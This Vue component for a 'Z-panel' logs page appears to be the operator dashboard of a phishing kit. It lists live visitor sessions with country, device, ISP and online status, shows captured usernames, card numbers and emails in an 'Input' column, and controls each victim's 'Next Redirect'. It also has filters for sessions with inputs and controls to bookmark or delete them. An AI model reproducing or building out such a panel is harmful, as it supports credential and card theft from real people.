<script>
    import {
        ref,
        defineComponent,
        reactive,
        computed,
        createApp,
        h
    } from 'vue';
    import highlightjs from '@/components/plugins/Highlightjs.vue';
    import VueTableLite from 'vue3-table-lite'
    import navscrollto from '@/components/app/NavScrollTo.vue';
    import { useAppOptionStore } from '@/stores/app-option';
    import {
        useAppVariableStore
    } from '@/stores/app-variable';
    import {
        useSessionStore
    } from '@/stores/sessionStore';
    import {
        ScrollSpy
    } from 'bootstrap';

    const appVariable = useAppVariableStore();
    const sessionStore = useSessionStore();
    const appOption = useAppOptionStore();

    let SessionIDSearch = ref("");
    let panelIDPageSearch = ref("");
    let InputSearch = ref("");
    let filter = reactive({
        enabled: false, count: 0
    });

    export default {
        data () {
            let searchFields = {
                SessionIDSearch,
                panelIDPageSearch,
                InputSearch,
            }
            const table = reactive({
                pageOptions: [{
                    value: 50, text: "50"
                }],
                columns: [{
                    label: "Session ID",
                    field: "SessionID",
                    width: "0%",
                    sortable: true,
                    isKey: true,
                },
                    {
                        label: "Status",
                        field: "Last_Online",
                        width: "6%",
                        sortable: true,
                    },
                    {
                        label: "Panel - Page",
                        field: "panelIDPage",
                        width: "4%",
                        sortable: true,
                        display: function(row) {
                            return row.panelId+" - "+row.pageID
                        }
                    },
                    {
                        label: "Actions",
                        field: "actions",
                        width: "3%",
                    },
                    {
                        label: "Info",
                        field: "Info",
                        width: "5%",
                        sortable: true,
                        display: function (row) {
                            let osIcon = "?"
                            let isp = "?"
                            if (row.ISP) {
                                isp = row.ISP;
                            }
                            if (row.OS == 'WinNT') {
                                osIcon = '<i class="deviceicon fa fa-windows" aria-hidden="true"></i>'
                            }
                            if (row.OS == 'Android') {
                                osIcon = '<i class="deviceicon fa fa-apple" aria-hidden="true"></i>'
                            }
                            if (row.OS == 'iPad' || row.OS == 'iPhone' || row.OS == 'MacOS') {
                                osIcon = '<i class="deviceicon fa fa-apple" aria-hidden="true"></i>'
                            }
                            if (row.Browser == 'Chrome') {
                                osIcon += '<i class="deviceicon ml fa fa-chrome aria-hidden="true"></i>'
                            }
                            if (row.Browser == 'Safari') {
                                osIcon += '<i class="deviceicon ml fa fa-safari aria-hidden="true"></i>'
                            }
                            let rowCountry = "?";
                            if (row.country) {
                                rowCountry = row.country
                            }
                            return (
                                "" + rowCountry + " / " + osIcon + " / " + isp
                            );
                        },
                    },
                    {
                        label: "Input",
                        field: "Input",
                        width: "5%",
                        display: function (row) {
                            let input = "";
                            if (row.username) {
                                input = row.username
                            }
                            if (row.cardnumber) {
                                input = row.cardnumber
                            }
                            if (row.email) {
                                input = row.email
                            }
                            return (
                                input
                            );
                        },
                        sortable: true,
                    },
                    {
                        label: "Next Redirect",
                        field: "Next_Redirect",
                        width: "5%",
                        sortable: true,
                    },
                ],
                rows: computed(()=> {
                    return sessionStore.pageResults;
                }),
                totalRecordCount: computed(() => {
                    return filter.enabled? filter.count: sessionStore.sessions.length;
                }),
                sortable: {
                    order: "Last_Online",
                    sort: "desc",
                },
            });

            const initTable = ({
                el: tableComponent
            }) => {
                let headerTr = tableComponent.getElementsByClassName("vtl-thead-tr");
                if (! headerTr[0]) {
                    return;
                }
                let cloneTr = headerTr[0].cloneNode(true); // Clone first <tr>
                let childTh = cloneTr.getElementsByClassName("vtl-thead-th");
                for (let i = 0; i < childTh.length; i++) {
                    // Clear <th>'s HTML
                    childTh[i].innerHTML = "";
                }

                // Create a input element and append to first <th>
                createApp(
                    defineComponent({
                        setup() {
                            return () =>
                            h("input", {
                                class: "searchBar",
                                value: searchFields.SessionIDSearch.value,
                                onInput: (e) => {
                                    searchFields.SessionIDSearch.value = e.target.value;
                                    filterResults()
                                },
                            });
                        },
                    })
                ).mount(childTh[0]);
                createApp(
                    defineComponent({
                        setup() {
                            return () =>
                            h("input", {
                                class: "searchBar",
                                value: searchFields.panelIDPageSearch.value,
                                onInput: (e) => {
                                    searchFields.panelIDPageSearch.value = e.target.value;
                                    filterResults()
                                },
                            });
                        },
                    })
                ).mount(childTh[2]);
                createApp(
                    defineComponent({
                        setup() {
                            return () =>
                            h("input", {
                                class: "searchBar",
                                value: searchFields.InputSearch.value,
                                onInput: (e) => {
                                    searchFields.InputSearch.value = e.target.value;
                                    filterResults()
                                },
                            });
                        },
                    })
                ).mount(childTh[5]);

                // append cloned element to the header after first <tr>
                headerTr[0].after(cloneTr)
            };

            const filterResults = () => {
                let filtered = false;
                let currentFilter = [...sessionStore.sessions];
                for (let field in searchFields) {
                    let fieldName = field.replace("Search", "");
                    let searchField = searchFields[field];
                    let term = typeof searchField._value != undefined ? searchField._value: searchField;
                    if (!term || term == "") {
                        continue;
                    }
                    filtered = true;
                    currentFilter = sessionStore.sessions.filter(session => {
                        if (!session[fieldName]) {
                            let col = table.columns.filter(col => col.field == fieldName)
                            if (!col) {
                                return false;
                            }
                            if (!col[0].display) {
                                return false;
                            }
                            let content = col[0].display(session);
                            return content.includes(term.toLowerCase())
                        }
                        return session[fieldName].toLowerCase().includes(term.toLowerCase())
                    })
                }
                sessionStore.selectedSessions = currentFilter;
                filter.count = currentFilter.length;
                filter.enabled = filtered;
                sessionStore.pageResults = currentFilter.slice(0,
                    50);
            }

            const doSearch = (offset,
                limit,
                order,
                sort) => {
                table.isLoading = true;
                setTimeout(() => {
                    table.isReSearch = offset == undefined ? true: false;
                    if (sort == "asc") {
                        let results = [...sessionStore.selectedSessions.map(a=> {
                            if (a[order] == null) {
                                a[order] = ""
                            }
                            return a
                        })]

                        results.sort((a, b) => a[order] > b[order] ? 1: -1);
                        sessionStore.pageResults = results.slice(offset,
                            offset+limit)
                    } else {
                        let results = [...sessionStore.selectedSessions.map(a=> {
                            if (a[order] == null) {
                                a[order] = ""
                            }
                            return a
                        })]
                        results.sort((a, b) => a[order] < b[order] ? 1: -1);
                        sessionStore.pageResults = results.slice(offset,
                            offset+limit)
                    }
                    table.sortable.order = order;
                    table.sortable.sort = sort;
                }, 600);
            };


            return {
                searchFields,
                table,
                doSearch,
                initTable,
                selectedPanel: "ALL",
                updateLogTimeout: null,
                currentTablePage: 1,
                selectedFilter: null
            }
        },
        components: {
            highlightjs: highlightjs,
            navScrollTo: navscrollto,
            VueTableLite: VueTableLite,
        },
        methods: {
            isOnline:function(str){
                if (!str) {
                    return null
                }
                try {
                    let ts = parseInt(str);
                    let d = new Date(ts*1000);
                    let now = new Date();
                    let seconds = parseInt(Math.abs(now.getTime() - d.getTime())/1000);
                    if (seconds <= 5) {
                        return true
                    }
                    else{
                        return false
                    }
                }
                catch(e){
                    return null
                }
            },
            timeAgo: function(str) {
                if (!str) {
                    return "??"
                }
                try {
                    let ts = parseInt(str);
                    let d = new Date(ts*1000);
                    let now = new Date();
                    let seconds = parseInt(Math.abs(now.getTime() - d.getTime())/1000);
                    if (seconds <= 5) {
                        return ""
                    }
                    if (seconds > 5 && seconds < 60) {
                        return "seen just now"
                    }
                    if (seconds >= 60 && seconds < 3600) {
                        let minutes = Math.round(seconds/60)
                        return "seen "+minutes+" minutes ago"
                    }
                    if (seconds >= 3600) {
                        return "seen a long time ago"
                    }
                }
                catch(e) {
                    return "-"
                }
            },
            loadPanelList: async function() {
                await sessionStore.getPanelList(false, false)
                this.onPanelSelect({
                    target: {
                        value: "ALL"
                    }})
            },
            onPanelSelect: function(ev, isUpdate = false) {
                sessionStore.stopUpdates();
                let selectedValue = ev.target.value;
                let panelChange = false
                if (this.selectedPanel != selectedValue) {
                    panelChange = true;
                }
                this.selectedPanel = selectedValue;
                sessionStore.selectedPanelName = selectedValue
                if (selectedValue == "") {
                    sessionStore.sessions = []
                    return
                }
                if (selectedValue == "ALL") {
                    sessionStore.getAllPanelSessions(panelChange, sessionStore.currentFilter)
                } else {
                    let valueParts = selectedValue.split("@");
                    let panelId = valueParts[0];
                    let nodeId = valueParts[1];
                    sessionStore.selectedPanel = {
                        panelId,
                        nodeId,
                    }
                    sessionStore.getSessionList(panelId, nodeId, false, isUpdate, sessionStore.currentFilter);
                }
            },
            bookmarkSession: async function(session) {
                let bookmarked = !session.bookmark || session.bookmark == "0" ? true: false;
                let result = await sessionStore.bookmarkSession(session, bookmarked)
                if (result.status == "ok") {
                    session.bookmark = bookmarked ? "1": "0"
                }
            },
            deleteSession: async function(session) {
                let result = await sessionStore.deleteSession(session)
                if (result.status == "ok") {
                    this.setFilter(this.currentFilter)
                }
            },
            setFilter: function(filtername) {
                if (filtername != this.selectedFilter) {
                    this.selectedFilter = filtername
                    sessionStore.setFilter(filtername)
                }
            }
        },
        computed: {
            panels: function() {
                return sessionStore.panels
            },
            sessions: function() {
                return sessionStore.sessions
            },
            selectedPanelName: function() {
                return sessionStore.selectedPanelName
            }
        },
        mounted() {
            console.log("mounted");
            //appOption.appSidebarCollapsed = true;
            sessionStore.currentFilter = null;
            sessionStore.selectedPanelName = "ALL"
            this.loadPanelList()
            // new ScrollSpy(document.body, {
            //     target: '#sidebar-bootstrap',
            //     offset: 200
            // })
        },
        beforeUnmount() {
		appOption.appSidebarCollapsed = false;
	}
    }


    
    </script>
    <style>
        .log-select {
            background: rgba(0,0,0,0.3);
            color: white;
            padding: 0.5em;
            border-radius: 0.5em;
            font-size: 1.15em;
            margin-bottom: 0.5em;
        }
        option {
            background: rgba(0,0,0);
        }
        .deviceicon {
            font-size: 1.2em
        }
        .ml {
            margin-left: 0.25em
        }
        .searchBar {
            width: 100%;
            border-radius: 0.5em;
            background-color: rgba(0,0,0,0);
            border: 2px solid grey;
            color: white;
        }
    </style>
    <template>
        <ul class="breadcrumb">
            <li class="breadcrumb-item"><a href="#">Z-panel</a></li>
            <li class="breadcrumb-item active">Logs</li>
        </ul>

        <h1 class="page-header">
        </h1>
        <!-- BEGIN #vue3TableLite -->
        <select class="log-select" @change="onPanelSelect($event)" v-model="selectedPanel" :value="selectedPanelName">
            <option v-if="panels" v-for="panel in panels" :value="panel.panelId+'@'+panel.nodeID">{{panel.panelId}} @ {{panel.nodeID }}</option>
            <option value="ALL">Show All</option>
            <option disabled v-if="!panels" value="no panels"></option>
        </select>
        <br />
        <div id="vue3TableLite" class="mb-5">
            <div v-if="selectedPanelName!='ALL'">
                <h4>Sessions for panel {{selectedPanelName}}</h4>
            </div>
            <div v-else>
                <h4>Sessions for all panels.</h4>
            </div>
            <br />
            <p v-if="!selectedPanelName">
                Select a panel to view session data
            </p>
            <card-body>
                <vue-table-lite v-if="sessions" class="vue-table"
                    :is-slot-mode="true"
                    :columns="table.columns"
                    :rows="table.rows"
                    :total="table.totalRecordCount"
                    :sortable="table.sortable"
                    @VnodeMounted="initTable"
                    :pageOptions="table.pageOptions"
                    :page="currentTablePage"
                    @do-search="doSearch">
                    <template v-slot:actions="data">
                        <div style="display: flex; justify-content: space-evenly;">
                            <button class="btn btn-outline-yellow btn-sm"
                                style="width: 30px; height: 30px; margin-right:2px;"
                                @click="bookmarkSession(data.value)">
                                <i class="fas me-2 fa-star" v-if="!data.value.bookmark || data.value.bookmark=='0'"></i>
                                <i class="fa-regular me-2 fa-star" v-if="data.value.bookmark=='1'"></i>
                            </button>
                            <button class="btn btn-outline-danger btn-sm"
                                style="width: 30px; height: 30px; margin-right:2px;"
                                @click="deleteSession(data.value)">
                                <i class="fas me-2 fa-trash"></i>
                            </button>
                        </div>
                    </template>
                    <template v-slot:SessionID="data">
                        <div style="align-items:center; display: flex; justify-content:center">
                            <i class="fas me-2 fa-star text-yellow" style="padding-right:0 !important" v-if="data.value.bookmark=='1'"></i>
                            <router-link :to="'/s/'+data.value.SessionID" style="flex-grow: 1">
                                <button type="button" class="w-100 btn btn-outline-theme btn-sm">
                                    {{data.value.SessionID}}
                                </button>
                            </router-link>
                        </div>
                    </template>
                    <template v-slot:pageID="data">
                        <router-link :to="'/s/'+data.value.SessionID">
                            <button type="button" class="w-100 btn btn-outline-theme btn-sm">
                                {{data.value.SessionID}}
                            </button>
                        </router-link>
                    </template>
                    <template v-slot:Last_Online="data">
                        <div class="row">
                            <span style="width:max-content" v-if="isOnline(data.value.Last_Online)" class='text-theme'>
                                <b>Online</b>
                            </span>
                            <span style="width:max-content" v-else>
                                <b>Offline, </b>{{timeAgo(data.value.Last_Online)}}     
                            </span>
                           <b-spinner v-if="isOnline(data.value.Last_Online)" small type="grow"  variant="theme" label="Loading..."></b-spinner>    
                        </div>           
                    </template>
                </vue-table-lite>
            </card-body>


        </div>
        <!-- END #vue3TableLite -->

        <p>

        </p>
        <div class="footer" style="z-index:1500 !important; display:flex !important; justify-content:center !important">
            <div class="btn-group" role="group" aria-label="Basic radio toggle button group">
                <input type="radio" class="btn-check" name="filter" id="filter1" autocomplete="off" checked>
                <label class="btn btn-outline-theme" for="filter1" @click="setFilter(null)">No filter</label>

                <input type="radio" class="btn-check" name="filter" id="filter2" autocomplete="off">
                <label class="btn btn-outline-theme" for="filter2" @click="setFilter('inputs')">With inputs</label>

                <input type="radio" class="btn-check" name="filter" id="filterx3" autocomplete="off">
                <label class="btn btn-outline-theme" for="filterx3" @click="setFilter('recent')">Recent</label>

                <input type="radio" class="btn-check" name="filter" id="filter4" autocomplete="off">
                <label class="btn btn-outline-theme" for="filter4" @click="setFilter('bookmarked')">Favorites</label>

            </div>
        </div>
    </template>